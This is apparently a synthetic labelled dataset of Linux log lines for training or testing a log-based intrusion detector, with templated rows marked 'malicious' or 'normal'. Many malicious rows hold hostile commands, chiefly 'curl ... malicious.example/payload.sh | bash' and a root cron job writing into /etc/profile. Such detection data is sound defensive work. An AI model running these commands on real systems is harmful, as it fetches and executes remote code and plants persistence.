id,log_text,label
2270,CRON[8041]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2271,kernel: [ 6586.46 ] Module loaded: suspicious_mod,malicious
2272,systemd[1]: Created malicious service persistence_3872.service,malicious
2273,systemd[1]: Created malicious service persistence_8394.service,malicious
2274,systemd[1]: Created malicious service persistence_4343.service,malicious
2275,networkd: DHCPv4 address assigned to eth0,normal
2276,sshd[6001]: Accepted publickey for user from 192.168.121.81 port 22 ssh2,normal
2277,systemd[1]: Started Session 3322 of user root.,normal
2278,CRON[3164]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2279,kernel: [ 2284.74 ] Module loaded: suspicious_mod,malicious
2280,CRON[5043]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2281,sshd[6128]: Accepted publickey for user from 192.168.92.26 port 22 ssh2,normal
2282,networkd: DHCPv4 address assigned to eth0,normal
2283,sshd[5008]: Accepted publickey for user from 192.168.67.67 port 22 ssh2,normal
2284,networkd: DHCPv4 address assigned to eth0,normal
2285,CRON[1813]: (root) CMD (uptime),normal
2286,sshd[9290]: Failed password for invalid user admin from 5.188.182.193 port 22 ssh2,malicious
2287,kernel: [ 2628.09 ] Module loaded: suspicious_mod,malicious
2288,bash[9154]: curl http://malicious.example/payload.sh | bash,malicious
2289,sshd[4119]: Accepted publickey for user from 192.168.41.78 port 22 ssh2,normal
2290,sshd[5863]: Failed password for invalid user admin from 5.188.53.131 port 22 ssh2,malicious
2291,kernel: [ 7951.05 ] USB device plugged,normal
2292,kernel: [ 7439.38 ] USB device plugged,normal
2293,kernel: [ 9973.12 ] Module loaded: suspicious_mod,malicious
2294,CRON[4538]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2295,kernel: [ 9504.83 ] USB device plugged,normal
2296,sshd[2491]: Failed password for invalid user admin from 5.188.213.156 port 22 ssh2,malicious
2297,CRON[1786]: (root) CMD (ls),normal
2298,sshd[6799]: Failed password for invalid user admin from 5.188.226.253 port 22 ssh2,malicious
2299,CRON[3189]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2300,CRON[1529]: (root) CMD (ls),normal
2301,systemd[1]: Started Session 9480 of user root.,normal
2302,CRON[3723]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2303,networkd: DHCPv4 address assigned to eth0,normal
2304,systemd[1]: Created malicious service persistence_1841.service,malicious
2305,sshd[6428]: Failed password for invalid user admin from 5.188.241.100 port 22 ssh2,malicious
2306,sshd[2432]: Accepted publickey for user from 192.168.26.37 port 22 ssh2,normal
2307,bash[6109]: curl http://malicious.example/payload.sh | bash,malicious
2308,CRON[9435]: (root) CMD (ls),normal
2309,kernel: [ 2883.07 ] USB device plugged,normal
2310,kernel: [ 1179.83 ] Module loaded: suspicious_mod,malicious
2311,systemd[1]: Started Session 1367 of user root.,normal
2312,CRON[3835]: (root) CMD (uptime),normal
2313,sshd[6049]: Accepted publickey for user from 192.168.157.126 port 22 ssh2,normal
2314,sshd[6678]: Accepted publickey for user from 192.168.236.18 port 22 ssh2,normal
2315,sshd[1926]: Failed password for invalid user admin from 5.188.96.71 port 22 ssh2,malicious
2316,CRON[5629]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2317,systemd[1]: Created malicious service persistence_8064.service,malicious
2318,systemd[1]: Started Session 4224 of user root.,normal
2319,systemd[1]: Started Session 9117 of user root.,normal
2320,sshd[7070]: Accepted publickey for user from 192.168.113.14 port 22 ssh2,normal
2321,systemd[1]: Created malicious service persistence_5724.service,malicious
2322,sshd[8639]: Failed password for invalid user admin from 5.188.121.193 port 22 ssh2,malicious
2323,networkd: DHCPv4 address assigned to eth0,normal
2324,sshd[1782]: Failed password for invalid user admin from 5.188.215.118 port 22 ssh2,malicious
2325,networkd: DHCPv4 address assigned to eth0,normal
2326,bash[4322]: curl http://malicious.example/payload.sh | bash,malicious
2327,sshd[9319]: Accepted publickey for user from 192.168.47.55 port 22 ssh2,normal
2328,bash[5470]: curl http://malicious.example/payload.sh | bash,malicious
2329,networkd: DHCPv4 address assigned to eth0,normal
2330,systemd[1]: Created malicious service persistence_4647.service,malicious
2331,CRON[9483]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2332,sshd[4875]: Accepted publickey for user from 192.168.101.74 port 22 ssh2,normal
2333,kernel: [ 5418.61 ] Module loaded: suspicious_mod,malicious
2334,kernel: [ 9163.6 ] USB device plugged,normal
2335,CRON[7403]: (root) CMD (uptime),normal
2336,networkd: DHCPv4 address assigned to eth0,normal
2337,systemd[1]: Created malicious service persistence_5050.service,malicious
2338,networkd: DHCPv4 address assigned to eth0,normal
2339,kernel: [ 1633.16 ] USB device plugged,normal
2340,sshd[4478]: Accepted publickey for user from 192.168.110.31 port 22 ssh2,normal
2341,systemd[1]: Created malicious service persistence_1999.service,malicious
2342,systemd[1]: Created malicious service persistence_9633.service,malicious
2343,kernel: [ 5694.03 ] USB device plugged,normal
2344,bash[6386]: curl http://malicious.example/payload.sh | bash,malicious
2345,bash[1644]: curl http://malicious.example/payload.sh | bash,malicious
2346,CRON[1806]: (root) CMD (uptime),normal
2347,systemd[1]: Created malicious service persistence_7296.service,malicious
2348,CRON[3412]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2349,CRON[2326]: (root) CMD (ls),normal
2350,systemd[1]: Started Session 3332 of user root.,normal
2351,systemd[1]: Created malicious service persistence_2998.service,malicious
2352,sshd[6303]: Accepted publickey for user from 192.168.46.154 port 22 ssh2,normal
2353,CRON[6263]: (root) CMD (ls),normal
2354,CRON[4368]: (root) CMD (pwd),normal
2355,kernel: [ 7657.66 ] USB device plugged,normal
2356,networkd: DHCPv4 address assigned to eth0,normal
2357,sshd[2179]: Failed password for invalid user admin from 5.188.129.104 port 22 ssh2,malicious
2358,systemd[1]: Started Session 5980 of user root.,normal
2359,systemd[1]: Started Session 3963 of user root.,normal
2360,sshd[7744]: Failed password for invalid user admin from 5.188.22.116 port 22 ssh2,malicious
2361,sshd[6373]: Accepted publickey for user from 192.168.68.164 port 22 ssh2,normal
2362,kernel: [ 7931.2 ] USB device plugged,normal
2363,CRON[1423]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2364,systemd[1]: Started Session 8747 of user root.,normal
2365,sshd[7510]: Accepted publickey for user from 192.168.127.1 port 22 ssh2,normal
2366,kernel: [ 4800.42 ] USB device plugged,normal
2367,sshd[9081]: Accepted publickey for user from 192.168.177.177 port 22 ssh2,normal
2368,CRON[1374]: (root) CMD (ls),normal
2369,networkd: DHCPv4 address assigned to eth0,normal
2370,systemd[1]: Created malicious service persistence_5937.service,malicious
2371,sshd[5934]: Failed password for invalid user admin from 5.188.212.217 port 22 ssh2,malicious
2372,kernel: [ 121.44 ] Module loaded: suspicious_mod,malicious
2373,sshd[9660]: Failed password for invalid user admin from 5.188.17.245 port 22 ssh2,malicious
2374,sshd[8871]: Failed password for invalid user admin from 5.188.237.192 port 22 ssh2,malicious
2375,kernel: [ 5255.77 ] USB device plugged,normal
2376,sshd[6941]: Accepted publickey for user from 192.168.164.75 port 22 ssh2,normal
2377,systemd[1]: Created malicious service persistence_3646.service,malicious
2378,networkd: DHCPv4 address assigned to eth0,normal
2379,sshd[1965]: Accepted publickey for user from 192.168.111.222 port 22 ssh2,normal
2380,CRON[8113]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2381,kernel: [ 2303.39 ] Module loaded: suspicious_mod,malicious
2382,sshd[9204]: Accepted publickey for user from 192.168.36.35 port 22 ssh2,normal
2383,kernel: [ 7960.62 ] Module loaded: suspicious_mod,malicious
2384,kernel: [ 8560.53 ] USB device plugged,normal
2385,sshd[7292]: Failed password for invalid user admin from 5.188.5.147 port 22 ssh2,malicious
2386,sshd[7618]: Accepted publickey for user from 192.168.103.10 port 22 ssh2,normal
2387,systemd[1]: Created malicious service persistence_2324.service,malicious
2388,sshd[2903]: Accepted publickey for user from 192.168.209.132 port 22 ssh2,normal
2389,CRON[2498]: (root) CMD (pwd),normal
2390,kernel: [ 836.28 ] Module loaded: suspicious_mod,malicious
2391,kernel: [ 9065.82 ] USB device plugged,normal
2392,systemd[1]: Created malicious service persistence_2488.service,malicious
2393,sshd[1561]: Accepted publickey for user from 192.168.40.20 port 22 ssh2,normal
2394,sshd[4112]: Failed password for invalid user admin from 5.188.116.27 port 22 ssh2,malicious
2395,bash[7562]: curl http://malicious.example/payload.sh | bash,malicious
2396,CRON[8957]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2397,bash[2585]: curl http://malicious.example/payload.sh | bash,malicious
2398,systemd[1]: Started Session 5179 of user root.,normal
2399,sshd[7042]: Accepted publickey for user from 192.168.46.235 port 22 ssh2,normal
2400,systemd[1]: Started Session 2143 of user root.,normal
2401,networkd: DHCPv4 address assigned to eth0,normal
2402,CRON[3532]: (root) CMD (pwd),normal
2403,systemd[1]: Created malicious service persistence_4548.service,malicious
2404,sshd[7959]: Accepted publickey for user from 192.168.6.239 port 22 ssh2,normal
2405,systemd[1]: Created malicious service persistence_1808.service,malicious
2406,kernel: [ 9146.07 ] USB device plugged,normal
2407,kernel: [ 6500.95 ] Module loaded: suspicious_mod,malicious
2408,CRON[4286]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2409,kernel: [ 4319.07 ] Module loaded: suspicious_mod,malicious
2410,systemd[1]: Started Session 8112 of user root.,normal
2411,kernel: [ 259.9 ] USB device plugged,normal
2412,systemd[1]: Created malicious service persistence_7632.service,malicious
2413,CRON[3264]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2414,sshd[6555]: Accepted publickey for user from 192.168.243.234 port 22 ssh2,normal
2415,systemd[1]: Started Session 1930 of user root.,normal
2416,systemd[1]: Created malicious service persistence_3462.service,malicious
2417,CRON[9290]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2418,sshd[2907]: Failed password for invalid user admin from 5.188.177.25 port 22 ssh2,malicious
2419,sshd[7027]: Accepted publickey for user from 192.168.32.11 port 22 ssh2,normal
2420,CRON[3284]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2421,bash[3276]: curl http://malicious.example/payload.sh | bash,malicious
2422,systemd[1]: Started Session 8167 of user root.,normal
2423,sshd[2127]: Failed password for invalid user admin from 5.188.203.216 port 22 ssh2,malicious
2424,kernel: [ 5645.22 ] USB device plugged,normal
2425,bash[3720]: curl http://malicious.example/payload.sh | bash,malicious
2426,sshd[3637]: Failed password for invalid user admin from 5.188.3.254 port 22 ssh2,malicious
2427,sshd[2394]: Failed password for invalid user admin from 5.188.187.154 port 22 ssh2,malicious
2428,sshd[6441]: Failed password for invalid user admin from 5.188.159.218 port 22 ssh2,malicious
2429,kernel: [ 6833.02 ] Module loaded: suspicious_mod,malicious
2430,CRON[1061]: (root) CMD (ls),normal
2431,systemd[1]: Started Session 6650 of user root.,normal
2432,networkd: DHCPv4 address assigned to eth0,normal
2433,kernel: [ 4619.74 ] Module loaded: suspicious_mod,malicious
2434,kernel: [ 423.48 ] USB device plugged,normal
2435,sshd[1636]: Failed password for invalid user admin from 5.188.239.76 port 22 ssh2,malicious
2436,kernel: [ 5420.59 ] USB device plugged,normal
2437,CRON[5110]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2438,bash[3513]: curl http://malicious.example/payload.sh | bash,malicious
2439,CRON[9928]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2440,CRON[6430]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2441,systemd[1]: Started Session 8041 of user root.,normal
2442,sshd[8295]: Accepted publickey for user from 192.168.162.24 port 22 ssh2,normal
2443,kernel: [ 2787.32 ] USB device plugged,normal
2444,networkd: DHCPv4 address assigned to eth0,normal
2445,systemd[1]: Started Session 6621 of user root.,normal
2446,systemd[1]: Started Session 3188 of user root.,normal
2447,sshd[5552]: Accepted publickey for user from 192.168.123.96 port 22 ssh2,normal
2448,systemd[1]: Created malicious service persistence_8679.service,malicious
2449,CRON[4024]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2450,sshd[1721]: Failed password for invalid user admin from 5.188.166.169 port 22 ssh2,malicious
2451,networkd: DHCPv4 address assigned to eth0,normal
2452,kernel: [ 9504.96 ] USB device plugged,normal
2453,systemd[1]: Created malicious service persistence_3706.service,malicious
2454,kernel: [ 9387.69 ] Module loaded: suspicious_mod,malicious
2455,kernel: [ 2000.57 ] USB device plugged,normal
2456,systemd[1]: Created malicious service persistence_8397.service,malicious
2457,kernel: [ 116.18 ] Module loaded: suspicious_mod,malicious
2458,sshd[5388]: Failed password for invalid user admin from 5.188.221.6 port 22 ssh2,malicious
2459,systemd[1]: Created malicious service persistence_6708.service,malicious
2460,systemd[1]: Created malicious service persistence_1105.service,malicious
2461,CRON[4472]: (root) CMD (whoami),normal
2462,CRON[7096]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2463,CRON[5756]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2464,networkd: DHCPv4 address assigned to eth0,normal
2465,bash[4684]: curl http://malicious.example/payload.sh | bash,malicious
2466,sshd[4355]: Accepted publickey for user from 192.168.129.46 port 22 ssh2,normal
2467,bash[5801]: curl http://malicious.example/payload.sh | bash,malicious
2468,CRON[6345]: (root) CMD (whoami),normal
2469,sshd[6579]: Failed password for invalid user admin from 5.188.209.118 port 22 ssh2,malicious
2470,systemd[1]: Started Session 5698 of user root.,normal
2471,kernel: [ 1455.23 ] USB device plugged,normal
2472,sshd[7959]: Failed password for invalid user admin from 5.188.72.99 port 22 ssh2,malicious
2473,networkd: DHCPv4 address assigned to eth0,normal
2474,CRON[8224]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2475,sshd[3260]: Failed password for invalid user admin from 5.188.216.219 port 22 ssh2,malicious
2476,CRON[4982]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2477,CRON[7125]: (root) CMD (uptime),normal
2478,kernel: [ 461.09 ] Module loaded: suspicious_mod,malicious
2479,CRON[2063]: (root) CMD (pwd),normal
2480,bash[8402]: curl http://malicious.example/payload.sh | bash,malicious
2481,systemd[1]: Started Session 7582 of user root.,normal
2482,sshd[6881]: Failed password for invalid user admin from 5.188.64.219 port 22 ssh2,malicious
2483,networkd: DHCPv4 address assigned to eth0,normal
2484,bash[6044]: curl http://malicious.example/payload.sh | bash,malicious
2485,systemd[1]: Started Session 5457 of user root.,normal
2486,sshd[5336]: Accepted publickey for user from 192.168.103.194 port 22 ssh2,normal
2487,bash[4446]: curl http://malicious.example/payload.sh | bash,malicious
2488,sshd[6795]: Failed password for invalid user admin from 5.188.108.210 port 22 ssh2,malicious
2489,systemd[1]: Created malicious service persistence_5019.service,malicious
2490,systemd[1]: Started Session 1495 of user root.,normal
2491,systemd[1]: Created malicious service persistence_6467.service,malicious
2492,bash[7511]: curl http://malicious.example/payload.sh | bash,malicious
2493,systemd[1]: Created malicious service persistence_2182.service,malicious
2494,systemd[1]: Started Session 2217 of user root.,normal
2495,kernel: [ 5158.71 ] USB device plugged,normal
2496,systemd[1]: Started Session 2100 of user root.,normal
